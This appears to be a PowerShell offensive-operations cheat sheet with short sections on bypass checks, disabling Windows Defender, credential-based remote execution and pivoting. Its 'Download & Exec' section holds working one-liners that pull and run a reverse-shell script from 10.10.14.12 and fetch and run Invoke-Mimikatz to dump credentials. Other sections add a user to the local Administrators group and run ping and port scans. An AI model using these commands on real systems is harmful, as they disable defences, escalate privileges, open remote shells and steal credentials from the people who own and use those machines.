# Powershell

## Contrained Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode

Invoke-Command -Session $ss -ScriptBlock  {$ExecitonContext,SessionState,LanguageMode}
```

## Applocker check

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty rulecollections
```

## AV disable

```powershell
Set-MpPreference -DisableRealTimeMonitoring $true ; Set-MpPreference -DisableIOAVProtection $true : Set-MpPreference -DisableRealTimeMonitoring $true ; Set-MpPreference -DisableIOAVProtection $true
```

## Impersonate 

```powershell
# PlainText
$Password = ConvertTo-SecureString "<pass>" -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential("<domain\user>", $Password);
Invoke-Command -ComputerName <target> -ScriptBlock { hostname; whoami } -Credential $Credential

# SecureString
$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000028bf2'
$passwd = $securepasswd | ConvertTo-SecureString
$passwd System.Security.SecureString
$creds = New-Object System.Management.Automation.PSCredential ("<domain>\administrator", $passwd)
Invoke-Command -ScriptBlock {net localgroup Administrators <domain>\<user> /add} -ComputerName <target> -Credential $creds
```

## Pivot

```powershell
$secure = New-PSSession -ComputerName <target>
Enter-PSSession -Session $secure
```

## Download & Exec

```powershell
iex (New-Object Net.Webclient).DownloadString("<remote_ps1>")

# Reverse powershell x64
c:\windows\sysnative\windowspowershell\v1.0\powershell.exe IEX(new-object net.webclient).downloadstring('http://10.10.14.12/Invoke-PowerShellTcp.ps1')


$ss = New-PSSession -ComputerName <target>
Enter-PSSession -Session $ss
Invoke-Command -Session $ss -ScriptBlock { iwr -uri http://192.168.56.2/Invoke-Mimikatz.ps1 -OutFile .\Invoke-Mimikatz.ps1 ; . .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz }
```

---

## Download file

```powershell
iwr -uri <file_url> -Outfile <outfile>
```

---

## Import PS1 module

```powershell
import-module <full_path_ps1_file>
. ./<ps1_file>
```
> Full path is mandatory for Import-Module !


## Ping Scans

```powershell
1..255| foreach {Test-Connection -ComputerName "192.168.1.$_"}
```

---

## Port Scan

```powershell
1..1024 | % { echo ((new-object Net.Sockets.TcpClient).Connect("<target>",$_)) "$_ is open" } 2>out-null
```

---
